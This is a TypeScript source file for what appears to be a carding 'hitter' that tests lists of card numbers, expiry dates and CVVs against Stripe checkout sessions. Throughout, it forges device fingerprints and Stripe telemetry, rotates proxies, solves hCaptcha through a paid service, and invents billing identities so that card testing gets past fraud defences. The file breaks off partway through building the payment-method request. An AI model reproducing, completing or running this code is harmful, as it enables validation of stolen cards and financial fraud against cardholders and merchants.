import crypto from "crypto";
import { ProxyAgent } from "undici";
import { classifyDecline, isRetryableError, HARD_DECLINE_CODES, SOFT_DECLINE_CODES, type DeclineCategory } from "./response-codes";

const DEBUG = process.env.DEBUG_CHECKER === "1";
function dbg(...args: any[]) { if (DEBUG) console.log("[hitter]", ...args); }

export interface CheckoutSessionData {
  sessionId: string;
  publishableKey: string;
  paymentIntentId: string;
  paymentIntentClientSecret: string;
  amount: number;
  currency: string;
  merchantName: string;
  description: string;
  status: string;
  mode: "payment" | "subscription" | "setup" | "unknown";
  captcha?: {
    siteKey: string;
    rqdata: string;
    enforcementMode: string;
  };
  raw?: any;
}

export type { DeclineCategory };

export interface HitResult {
  card: string;
  status: "success" | "declined" | "error" | "approved";
  response: string;
  latency: number;
  piId?: string;
  sessionLocked?: boolean;
  declineCategory?: DeclineCategory;
}

export async function hitCheckoutWithCardRetry(
  session: CheckoutSessionData,
  cardStr: string,
  maxRetries: number = 2,
  confirmDelay: number = 0,
  tokenReuse: boolean = false
): Promise<HitResult> {
  let lastResult: HitResult | null = null;
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const result = await hitCheckoutWithCard(session, cardStr, confirmDelay, tokenReuse);
    lastResult = result;
    if (result.sessionLocked) return result;
    if (result.status === "success") return result;
    if (!isRetryableError(result.status, result.response)) return result;
    if (attempt < maxRetries) {
      const backoff = Math.pow(2, attempt) * 1000 + Math.floor(Math.random() * 500);
      dbg(`Retryable error for ${cardStr.substring(0, 6)}..., attempt ${attempt + 1}/${maxRetries}, waiting ${backoff}ms`);
      await new Promise(r => setTimeout(r, backoff));
    }
  }
  return lastResult!;
}

export async function hitCardsParallel(
  session: CheckoutSessionData,
  cards: string[],
  concurrency: number = 1,
  delayMs: number = 2000,
  onResult?: (result: HitResult, index: number) => void,
  confirmDelay: number = 0,
  tokenReuse: boolean = false
): Promise<HitResult[]> {
  const results: HitResult[] = new Array(cards.length);
  let sessionLocked = false;
  let nextIdx = 0;

  async function processCard(idx: number): Promise<void> {
    if (sessionLocked) {
      const skipped: HitResult = {
        card: cards[idx],
        status: "error",
        response: "SKIPPED ⚠ Session locked by previous card (3DS/payment pending)",
        latency: 0,
        sessionLocked: true,
      };
      results[idx] = skipped;
      onResult?.(skipped, idx);
      return;
    }

    const result = await hitCheckoutWithCardRetry(session, cards[idx], 2, confirmDelay, tokenReuse);
    results[idx] = result;
    onResult?.(result, idx);

    if (result.sessionLocked) {
      sessionLocked = true;
      dbg(`Session locked after card index ${idx} — skipping remaining`);
    }
  }

  async function worker(): Promise<void> {
    while (true) {
      const idx = nextIdx++;
      if (idx >= cards.length) return;
      if (idx > 0 && delayMs > 0) {
        const jitter = Math.floor(Math.random() * (delayMs * 0.5));
        await new Promise(r => setTimeout(r, delayMs + jitter));
      }
      await processCard(idx);
    }
  }

  const actualConcurrency = Math.min(concurrency, cards.length, 10);
  const workers = Array.from({ length: actualConcurrency }, () => worker());
  await Promise.all(workers);

  return results;
}

const DEVICE_PROFILES = [
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    secChUa: '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="24"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 1920, h: 1080, d: 24, r: 1 },
    tz: -300, tzName: "America/New_York",
    webglRenderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1060 6GB Direct3D11 vs_5_0 ps_5_0, D3D11)",
    webglVendor: "Google Inc. (NVIDIA)",
    hardwareConcurrency: 8,
    deviceMemory: 8,
    audioContextHash: "35.74936294555664",
    batteryCharging: true,
    batteryLevel: 0.87,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    secChUa: '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 2560, h: 1440, d: 24, r: 1 },
    tz: -360, tzName: "America/Chicago",
    webglRenderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Direct3D11 vs_5_0 ps_5_0, D3D11)",
    webglVendor: "Google Inc. (NVIDIA)",
    hardwareConcurrency: 16,
    deviceMemory: 16,
    audioContextHash: "35.74936294555664",
    batteryCharging: false,
    batteryLevel: 0.62,
  },
  {
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    secChUa: '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="24"',
    secChUaPlatform: '"macOS"',
    platform: "MacIntel",
    screen: { w: 1440, h: 900, d: 24, r: 2 },
    tz: -420, tzName: "America/Los_Angeles",
    webglRenderer: "ANGLE (Apple, Apple M1, OpenGL 4.1)",
    webglVendor: "Google Inc. (Apple)",
    hardwareConcurrency: 8,
    deviceMemory: 8,
    audioContextHash: "124.04347527516074",
    batteryCharging: true,
    batteryLevel: 1.0,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    secChUa: '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 1366, h: 768, d: 24, r: 1 },
    tz: -480, tzName: "America/Los_Angeles",
    webglRenderer: "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)",
    webglVendor: "Google Inc. (Intel)",
    hardwareConcurrency: 4,
    deviceMemory: 4,
    audioContextHash: "35.10893232002854",
    batteryCharging: true,
    batteryLevel: 0.54,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    secChUa: '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 1536, h: 864, d: 24, r: 1.25 },
    tz: -300, tzName: "America/New_York",
    webglRenderer: "ANGLE (AMD, AMD Radeon RX 580 Series Direct3D11 vs_5_0 ps_5_0, D3D11)",
    webglVendor: "Google Inc. (AMD)",
    hardwareConcurrency: 8,
    deviceMemory: 8,
    audioContextHash: "35.74936294555664",
    batteryCharging: false,
    batteryLevel: 0.33,
  },
  {
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    secChUa: '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    secChUaPlatform: '"macOS"',
    platform: "MacIntel",
    screen: { w: 3840, h: 2160, d: 24, r: 1.5 },
    tz: 0, tzName: "Europe/London",
    webglRenderer: "ANGLE (Apple, Apple M2 Pro, OpenGL 4.1)",
    webglVendor: "Google Inc. (Apple)",
    hardwareConcurrency: 12,
    deviceMemory: 16,
    audioContextHash: "124.04347527516074",
    batteryCharging: true,
    batteryLevel: 0.95,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    secChUa: '"Microsoft Edge";v="131", "Chromium";v="131", "Not/A)Brand";v="24"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 1920, h: 1200, d: 24, r: 1 },
    tz: -300, tzName: "America/New_York",
    webglRenderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 SUPER Direct3D11 vs_5_0 ps_5_0, D3D11)",
    webglVendor: "Google Inc. (NVIDIA)",
    hardwareConcurrency: 12,
    deviceMemory: 16,
    audioContextHash: "35.74936294555664",
    batteryCharging: true,
    batteryLevel: 0.78,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
    secChUa: '"Microsoft Edge";v="141", "Chromium";v="141", "Not?A_Brand";v="8"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 2560, h: 1440, d: 24, r: 1.25 },
    tz: -360, tzName: "America/Chicago",
    webglRenderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
    webglVendor: "Google Inc. (NVIDIA)",
    hardwareConcurrency: 16,
    deviceMemory: 16,
    audioContextHash: "35.10893232002854",
    batteryCharging: false,
    batteryLevel: 0.45,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    secChUa: '"Firefox";v="132", "Not A(Brand";v="99"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 1920, h: 1080, d: 24, r: 1 },
    tz: -480, tzName: "America/Los_Angeles",
    webglRenderer: "AMD Radeon RX 580 Series",
    webglVendor: "ATI Technologies Inc.",
    hardwareConcurrency: 8,
    deviceMemory: 8,
    audioContextHash: "35.74936294555664",
    batteryCharging: true,
    batteryLevel: 0.91,
  },
  {
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0",
    secChUa: '"Firefox";v="131", "Not A(Brand";v="99"',
    secChUaPlatform: '"macOS"',
    platform: "MacIntel",
    screen: { w: 1440, h: 900, d: 24, r: 2 },
    tz: -420, tzName: "America/Los_Angeles",
    webglRenderer: "Apple M1",
    webglVendor: "Apple",
    hardwareConcurrency: 8,
    deviceMemory: 8,
    audioContextHash: "124.04347527516074",
    batteryCharging: true,
    batteryLevel: 1.0,
  },
  {
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    secChUa: '"Firefox";v="128", "Not A(Brand";v="99"',
    secChUaPlatform: '"Windows"',
    platform: "Win32",
    screen: { w: 1680, h: 1050, d: 24, r: 1 },
    tz: 60, tzName: "Europe/Paris",
    webglRenderer: "NVIDIA GeForce GTX 1050 Ti",
    webglVendor: "NVIDIA Corporation",
    hardwareConcurrency: 4,
    deviceMemory: 4,
    audioContextHash: "35.10893232002854",
    batteryCharging: false,
    batteryLevel: 0.29,
  },
  {
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
    secChUa: '"Microsoft Edge";v="132", "Chromium";v="132", "Not-A.Brand";v="99"',
    secChUaPlatform: '"macOS"',
    platform: "MacIntel",
    screen: { w: 2560, h: 1600, d: 24, r: 2 },
    tz: 0, tzName: "Europe/London",
    webglRenderer: "ANGLE (Apple, Apple M2, OpenGL 4.1)",
    webglVendor: "Google Inc. (Apple)",
    hardwareConcurrency: 8,
    deviceMemory: 16,
    audioContextHash: "124.04347527516074",
    batteryCharging: true,
    batteryLevel: 0.73,
  },
];

type DeviceProfile = typeof DEVICE_PROFILES[number];

const STRIPE_JS_VERSIONS = [
  "7ab2721f84", "cfa7bc6281", "a7b74c0b44", "67480e0cc3", "b8c85d1e55",
  "d4f0e3c1a2", "9e8f7d6c5b", "1a2b3c4d5e", "f6e5d4c3b2", "8b7a6f5e4d",
  "c3d2e1f0a9", "5f4e3d2c1b",
];

const BILLING_DATA = [
  { city: "New York", state: "New York", zip: "10001", country: "US" },
  { city: "Los Angeles", state: "California", zip: "90001", country: "US" },
  { city: "Chicago", state: "Illinois", zip: "60601", country: "US" },
  { city: "Houston", state: "Texas", zip: "77001", country: "US" },
  { city: "London", state: "England", zip: "EC1A 1BB", country: "GB" },
  { city: "Toronto", state: "Ontario", zip: "M5H 2N2", country: "CA" },
];

const EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"];

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)]; }

function stableFingerHash(seed: string): string {
  const h = crypto.createHash("md5").update(seed).digest("hex");
  return h;
}

function stableCanvasFP(seed: string): string {
  const hash = crypto.createHash("sha256").update("canvas:" + seed).digest();
  return Array.from(hash.subarray(0, 8)).map(b =>
    b.toString(2).padStart(8, "0")
  ).join("");
}

interface SessionCtx {
  profile: DeviceProfile;
  stripeVer: string;
  canvasFP: string;
  fingerHash: string;
  sessionSeed: string;
  pinnedProxy: ProxyEntry | null;
}

function generateSessionProfile(): SessionCtx {
  const profile = pick(DEVICE_PROFILES);
  const stripeVer = pick(STRIPE_JS_VERSIONS);
  const sessionSeed = crypto.randomUUID();
  const canvasFP = stableCanvasFP(sessionSeed);
  const fingerHash = stableFingerHash(
    `${profile.platform}:${profile.screen.w}x${profile.screen.h}:${profile.tz}:${canvasFP}`
  );
  const pinnedProxy = pickProxyForCard();
  if (pinnedProxy) {
    dbg(`Pinned proxy for card session: ${pinnedProxy.ip}:${pinnedProxy.port}`);
  }
  return { profile, stripeVer, canvasFP, fingerHash, sessionSeed, pinnedProxy };
}

function buildTelemetryPayload(
  pk: string,
  profile: DeviceProfile,
  stripeVer: string,
  canvasFP: string,
  fingerHash: string,
): Record<string, any> {
  let cursor = Math.floor(Math.random() * 10) + 2;
  function nextT() { cursor += Math.floor(Math.random() * 8) + 1; return cursor; }

  return {
    v2: 1,
    id: stableFingerHash(pk + fingerHash),
    k: pk,
    t: String(Math.floor(Math.random() * 600) + 100),
    tag: stripeVer,
    src: "js",
    a: {
      a: { v: "true", t: nextT() },
      b: { v: "false", t: nextT() },
      c: { v: "en-US", t: nextT() },
      d: { v: profile.platform, t: nextT() },
      e: { v: "PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf|Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf", t: nextT() },
      f: { v: `${profile.screen.w}w_${profile.screen.h - 40}h_${profile.screen.d}d_${profile.screen.r}r`, t: nextT() },
      g: { v: String(profile.tz), t: nextT() },
      h: { v: "false", t: nextT() },
      i: { v: "sessionStorage-enabled, localStorage-enabled", t: nextT() },
      j: { v: canvasFP, t: nextT() },
      k: { v: "", t: nextT() },
      l: { v: profile.ua, t: nextT() },
      m: { v: "", t: nextT() },
      n: { v: "false", t: nextT(), at: 0 },
      o: { v: fingerHash, t: nextT() },
      p: { v: profile.webglRenderer, t: nextT() },
      q: { v: String(profile.hardwareConcurrency), t: nextT() },
      r: { v: String(profile.deviceMemory), t: nextT() },
      s: { v: profile.audioContextHash, t: nextT() },
    },
    b: {
      a: { v: "https://checkout.stripe.com" },
    },
  };
}

function getProfileHeaders(profile: DeviceProfile): Record<string, string> {
  return {
    "Content-Type": "application/x-www-form-urlencoded",
    Accept: "application/json",
    "accept-language": "en-US,en;q=0.9",
    Origin: "https://js.stripe.com",
    Referer: "https://js.stripe.com/",
    "User-Agent": profile.ua,
    "sec-ch-ua": profile.secChUa,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": profile.secChUaPlatform,
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
  };
}

export interface ProxyEntry {
  ip: string;
  port: number;
  protocol: string;
}

let proxyPool: ProxyEntry[] = [];
let proxyIdx = 0;

const pmCache = new Map<string, { pmId: string; brand: string; last4: string; expires: number }>();

export function getCachedPmCount(): number {
  let count = 0;
  const now = Date.now();
  for (const [, v] of pmCache) {
    if (v.expires > now) count++;
  }
  return count;
}

function getCachedPm(cardStr: string): { pmId: string; brand: string; last4: string } | null {
  const entry = pmCache.get(cardStr);
  if (!entry) return null;
  if (Date.now() > entry.expires) {
    pmCache.delete(cardStr);
    return null;
  }
  return { pmId: entry.pmId, brand: entry.brand, last4: entry.last4 };
}

function cachePm(cardStr: string, pmId: string, brand: string, last4: string) {
  pmCache.set(cardStr, { pmId, brand, last4, expires: Date.now() + 15 * 60 * 1000 });
}

const SUPPORTED_PROXY_PROTOCOLS = new Set(["http", "https"]);

interface ProxyHealth {
  successes: number;
  failures: number;
  score: number;
  lastFailure: number;
}

const proxyHealthMap = new Map<string, ProxyHealth>();

function proxyKey(p: ProxyEntry): string { return `${p.ip}:${p.port}`; }

function getProxyHealth(p: ProxyEntry): ProxyHealth {
  const key = proxyKey(p);
  if (!proxyHealthMap.has(key)) {
    proxyHealthMap.set(key, { successes: 0, failures: 0, score: 100, lastFailure: 0 });
  }
  return proxyHealthMap.get(key)!;
}

export function recordProxySuccess(p: ProxyEntry) {
  const h = getProxyHealth(p);
  h.successes++;
  h.score = Math.min(100, h.score + 5);
}

export function recordProxyFailure(p: ProxyEntry) {
  const h = getProxyHealth(p);
  h.failures++;
  h.score = Math.max(0, h.score - 20);
  h.lastFailure = Date.now();
}

export function setProxyPool(proxies: ProxyEntry[]) {
  proxyPool = proxies.filter(p => p.ip && p.port && SUPPORTED_PROXY_PROTOCOLS.has(p.protocol || "http"));
  proxyIdx = 0;
  dbg(`Proxy pool set: ${proxyPool.length} proxies (filtered unsupported protocols)`);
}

export function getProxyCount(): number {
  return proxyPool.length;
}

function getNextProxy(): ProxyEntry | null {
  if (proxyPool.length === 0) return null;
  const healthy = proxyPool.filter(p => {
    const h = getProxyHealth(p);
    if (h.score <= 10 && h.lastFailure > Date.now() - 5 * 60 * 1000) return false;
    return true;
  });
  const pool = healthy.length > 0 ? healthy : proxyPool;
  pool.sort((a, b) => getProxyHealth(b).score - getProxyHealth(a).score);
  const topN = Math.max(1, Math.ceil(pool.length * 0.5));
  const proxy = pool[proxyIdx % topN];
  proxyIdx++;
  return proxy;
}

function makeProxyDispatcher(proxy: ProxyEntry): ProxyAgent {
  const proto = proxy.protocol || "http";
  const uri = `${proto}://${proxy.ip}:${proxy.port}`;
  return new ProxyAgent({ uri, requestTls: { rejectUnauthorized: false } } as any);
}

function isProxyErrorResponse(resp: Response): boolean {
  return resp.status === 407 || resp.status === 502 || resp.status === 503;
}

async function proxiedFetch(
  url: string,
  opts: RequestInit & { signal?: AbortSignal } = {},
  pinnedProxy?: ProxyEntry | null
): Promise<Response> {
  const proxy = pinnedProxy !== undefined ? pinnedProxy : getNextProxy();
  if (proxy) {
    const dispatcher = makeProxyDispatcher(proxy);
    dbg(`Using proxy ${proxy.ip}:${proxy.port}`);
    try {
      const resp = await fetch(url, { ...opts, dispatcher } as any);
      if (isProxyErrorResponse(resp)) {
        recordProxyFailure(proxy);
        dbg(`Proxy ${proxy.ip}:${proxy.port} returned ${resp.status}, falling back to direct`);
        return fetch(url, opts);
      }
      recordProxySuccess(proxy);
      return resp;
    } catch (e: any) {
      recordProxyFailure(proxy);
      dbg(`Proxy ${proxy.ip}:${proxy.port} failed: ${e.message}, falling back to direct`);
    }
  }
  return fetch(url, opts);
}

function pickProxyForCard(): ProxyEntry | null {
  return getNextProxy();
}
function rndStr(len: number): string { return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join(""); }
function rndEmail(): string { return `${rndStr(8)}${Math.floor(Math.random() * 9000) + 1000}@${pick(EMAIL_DOMAINS)}`; }
function rndName(): string {
  const first = ["James", "Mary", "John", "Emma", "Robert", "Sarah", "Michael", "Laura", "David", "Anna"];
  const last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"];
  return `${pick(first)} ${pick(last)}`;
}


function extractSessionId(url: string): string | null {
  const m = url.match(/cs_(live|test)_[a-zA-Z0-9]+/);
  return m ? m[0] : null;
}

function decodeCheckoutFragment(fragment: string): { apiKey?: string; [k: string]: any } {
  try {
    const decoded = decodeURIComponent(fragment);
    const b64decoded = Buffer.from(decoded, "base64").toString("binary");
    let result = "";
    for (let i = 0; i < b64decoded.length; i++) {
      result += String.fromCharCode(5 ^ b64decoded.charCodeAt(i));
    }
    return JSON.parse(result.trim());
  } catch {
    return {};
  }
}

export async function parseCheckoutLink(url: string): Promise<CheckoutSessionData> {
  const sessionId = extractSessionId(url);
  if (!sessionId) {
    throw new Error("Could not extract checkout session ID (cs_live_* or cs_test_*) from URL");
  }

  dbg(`Extracted session ID: ${sessionId}`);

  const parseProfile = pick(DEVICE_PROFILES);
  const ua = parseProfile.ua;
  let pk: string | null = null;

  const inputHashMatch = url.match(/#(.+)$/);
  if (inputHashMatch) {
    const fragData = decodeCheckoutFragment(inputHashMatch[1]);
    if (fragData.apiKey) {
      pk = fragData.apiKey;
      dbg(`Extracted pk from input URL fragment: ${pk.substring(0, 25)}...`);
    }
  }

  if (!pk) {
    const fetchUrl = url.replace(/#.*$/, "");
    const pageResp = await proxiedFetch(fetchUrl, {
      headers: {
        "User-Agent": ua,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    const finalUrl = pageResp.url;
    const html = await pageResp.text();

    const redirectHashMatch = finalUrl.match(/#(.+)$/);
    if (redirectHashMatch) {
      const fragData = decodeCheckoutFragment(redirectHashMatch[1]);
      if (fragData.apiKey) {
        pk = fragData.apiKey;
        dbg(`Extracted pk from redirect URL fragment: ${pk.substring(0, 25)}...`);
      }
    }

    if (!pk) {
      const metaRefresh = html.match(/url=([^"']+#[^"']+)/i);
      if (metaRefresh) {
        const fragPart = metaRefresh[1].match(/#(.+)$/);
        if (fragPart) {
          const fragData = decodeCheckoutFragment(fragPart[1]);
          if (fragData.apiKey) {
            pk = fragData.apiKey;
            dbg(`Extracted pk from meta-refresh fragment: ${pk.substring(0, 25)}...`);
          }
        }
      }
    }

    if (!pk) {
      const fragInHtml = html.match(/checkout\.stripe\.com[^"']*#([a-zA-Z0-9%+=\/]+)/);
      if (fragInHtml) {
        const fragData = decodeCheckoutFragment(fragInHtml[1]);
        if (fragData.apiKey) {
          pk = fragData.apiKey;
          dbg(`Extracted pk from HTML fragment link: ${pk.substring(0, 25)}...`);
        }
      }
    }

  }

  if (!pk) {
    throw new Error("Could not extract publishable key. Make sure you paste the FULL checkout URL including the #fragment part after the hash.");
  }

  const checkoutHeaders = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": ua,
    Origin: "https://checkout.stripe.com",
    Referer: "https://checkout.stripe.com/",
  };

  const initBody = new URLSearchParams();
  initBody.set("key", pk);
  initBody.set("browser_locale", "en-US");
  initBody.set("browser_timezone", parseProfile.tzName);

  dbg("Calling payment_pages init...");
  const initResp = await proxiedFetch(`https://api.stripe.com/v1/payment_pages/${sessionId}/init`, {
    method: "POST",
    headers: checkoutHeaders,
    body: initBody.toString(),
    signal: AbortSignal.timeout(15000),
  });
  const pp = await initResp.json();

  if (pp.error) {
    dbg("Init failed, falling back to GET...");
    const ppResp = await proxiedFetch(`https://api.stripe.com/v1/payment_pages/${sessionId}?key=${pk}`, {
      headers: { "User-Agent": ua, Origin: "https://checkout.stripe.com", Referer: "https://checkout.stripe.com/" },
      signal: AbortSignal.timeout(10000),
    });
    const ppFallback = await ppResp.json();

    if (ppFallback.error) {
      throw new Error(`Could not fetch session data: ${ppFallback.error.message || pp.error.message || "Unknown error"}`);
    }

    Object.assign(pp, ppFallback);
  } else {
    dbg("Init successful");
  }

  const piObj = pp.payment_intent;
  const piId = typeof piObj === "string" ? piObj : piObj?.id || "";
  const piSecret = typeof piObj === "object" ? piObj?.client_secret || "" : "";
  const mode = pp.mode || "unknown";
  const totalAmount = pp.total_summary?.total ?? pp.amount_total ?? 0;

  const lineItems = pp.line_item_group?.line_items || [];
  const firstItemName = lineItems[0]?.name || "";
  const merchantDisplay = pp.account_settings?.branding?.name
    || pp.account_settings?.display_name || "";

  const captchaInfo = pp.site_key ? {
    siteKey: pp.site_key,
    rqdata: pp.rqdata || "",
    enforcementMode: pp.enforcement_mode || "unknown",
  } : undefined;

  if (captchaInfo) {
    dbg(`hCaptcha detected: siteKey=${captchaInfo.siteKey.substring(0, 12)}..., mode=${captchaInfo.enforcementMode}`);
  }

  return {
    sessionId,
    publishableKey: pk,
    paymentIntentId: piId,
    paymentIntentClientSecret: piSecret,
    amount: totalAmount / 100,
    currency: (pp.currency || "usd").toUpperCase(),
    merchantName: merchantDisplay || "Stripe Merchant",
    description: firstItemName || `${mode} checkout`,
    status: pp.status || pp.payment_status || "unknown",
    mode: mode as CheckoutSessionData["mode"],
    captcha: captchaInfo,
    raw: pp,
  };
}

interface StripeMids {
  muid: string;
  guid: string;
  sid: string;
}

const midsCache = new Map<string, { mids: StripeMids; expires: number }>();

async function getStripeMids(
  pk: string,
  sessionCtx: SessionCtx,
  forceNew = false
): Promise<StripeMids> {
  if (!forceNew) {
    const cached = midsCache.get(pk);
    if (cached && Date.now() < cached.expires) {
      return cached.mids;
    }
  }
  try {
    const telemetry = buildTelemetryPayload(pk, sessionCtx.profile, sessionCtx.stripeVer, sessionCtx.canvasFP, sessionCtx.fingerHash);
    const resp = await proxiedFetch("https://m.stripe.com/6", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": sessionCtx.profile.ua,
        Origin: "https://checkout.stripe.com",
        Referer: "https://checkout.stripe.com/",
      },
      body: JSON.stringify(telemetry),
      signal: AbortSignal.timeout(5000),
    }, sessionCtx.pinnedProxy);
    const data = await resp.json();
    if (data.muid && data.guid && data.sid) {
      const mids = { muid: data.muid, guid: data.guid, sid: data.sid };
      if (!forceNew) {
        midsCache.set(pk, { mids, expires: Date.now() + 10 * 60 * 1000 });
      }
      dbg(`Got ${forceNew ? "fresh" : "cached"} mids from m.stripe.com: guid=${mids.guid.substring(0, 12)}...`);
      return mids;
    }
  } catch (e: any) {
    dbg(`Failed to get mids from m.stripe.com: ${e.message}`);
  }
  return {
    muid: crypto.randomUUID(),
    guid: crypto.randomUUID(),
    sid: crypto.randomUUID(),
  };
}

export async function solveHCaptcha(
  siteKey: string,
  rqdata: string,
  pageUrl: string
): Promise<{ token: string; ekey?: string } | null> {
  const apiKey = process.env.CAPSOLVER_API_KEY;
  if (!apiKey) {
    dbg("No CAPSOLVER_API_KEY set — skipping hCaptcha solve");
    return null;
  }

  dbg(`Solving hCaptcha via Capsolver: siteKey=${siteKey.substring(0, 12)}...`);

  try {
    const createResp = await fetch("https://api.capsolver.com/createTask", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        clientKey: apiKey,
        task: {
          type: "HCaptchaTaskProxyLess",
          websiteURL: pageUrl,
          websiteKey: siteKey,
          enterprisePayload: rqdata ? { rqdata } : undefined,
        },
      }),
      signal: AbortSignal.timeout(10000),
    });
    const createData = await createResp.json();
    if (createData.errorId) {
      dbg(`Capsolver create error: ${createData.errorDescription || createData.errorCode}`);
      return null;
    }

    const taskId = createData.taskId;
    if (!taskId) {
      dbg("Capsolver: no taskId returned");
      return null;
    }

    dbg(`Capsolver task created: ${taskId}`);

    for (let i = 0; i < 60; i++) {
      await new Promise(r => setTimeout(r, 3000));

      const getResp = await fetch("https://api.capsolver.com/getTaskResult", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ clientKey: apiKey, taskId }),
        signal: AbortSignal.timeout(10000),
      });
      const result = await getResp.json();

      if (result.status === "ready") {
        const token = result.solution?.gRecaptchaResponse || result.solution?.token;
        const ekey = result.solution?.ekey;
        if (token) {
          dbg(`hCaptcha solved: token=${token.substring(0, 30)}...`);
          return { token, ekey };
        }
        dbg("Capsolver returned ready but no token");
        return null;
      }

      if (result.errorId) {
        dbg(`Capsolver error: ${result.errorDescription || result.errorCode}`);
        return null;
      }
    }

    dbg("Capsolver timeout (3min)");
    return null;
  } catch (e: any) {
    dbg(`Capsolver error: ${e.message}`);
    return null;
  }
}

function parseCard(cardStr: string): { cc: string; mm: string; yy: string; cvv: string } | null {
  const parts = cardStr.split(/[|:;,\s]+/).map(s => s.trim()).filter(Boolean);
  if (parts.length < 4) return null;
  const [cc, mm, yy, cvv] = parts;
  if (!/^\d{13,19}$/.test(cc)) return null;
  if (!/^\d{1,2}$/.test(mm)) return null;
  if (!/^\d{2,4}$/.test(yy)) return null;
  if (!/^\d{3,4}$/.test(cvv)) return null;
  return { cc, mm: mm.padStart(2, "0"), yy: yy.length === 2 ? `20${yy}` : yy, cvv };
}

interface PmBillingInfo {
  name: string;
  email: string;
  line1: string;
  city: string;
  state: string;
  zip: string;
  country: string;
}

interface PmResult {
  id: string;
  brand: string;
  last4: string;
  error?: string;
  billingInfo?: PmBillingInfo;
}

async function createPaymentMethod(
  cc: string, mm: string, yy: string, cvv: string,
  pk: string,
  sessionCtx: SessionCtx,
  freshIdentity = false
): Promise<PmResult> {
  const billing = pick(BILLING_DATA);
  const name = rndName();
  const email = rndEmail();
  const line1 = `${Math.floor(Math.random() * 9000) + 100} Main St`;
  const headers = getProfileHeaders(sessionCtx.profile);
  const mids = await getStripeMids(pk, sessionCtx, freshIdentity);

  const surfaces = [
    { surface: "payment-element", endpoint: "payment_methods" },
    { surface: "card-element", endpoint: "payment_methods" },
  ];

  for (const { surface, endpoint } of surfaces) {
    const body = new URLSearchParams();
    body.set("type", "card");
    body.set("billing_details[name]", name);
    body.set("billing_details[email]", email);
    body.set("billing_details[address][line1]", line1);
    body.set("billing_details[address][city]", billing.city);
    body.set("billing_details[address][state]", billing.state);
    body.set("billing_details[address][postal_code]", billing.zip);
    body.set("billing_details[address][country]", billing.country);
    body.set("card[number]", cc);
    body.set("card[cvc]", cvv);
    body.set("card[exp_month]", mm);
    body.set("card[exp_year]", yy);
    body.set("guid", mids.guid);
    body.set("muid", mids.muid);
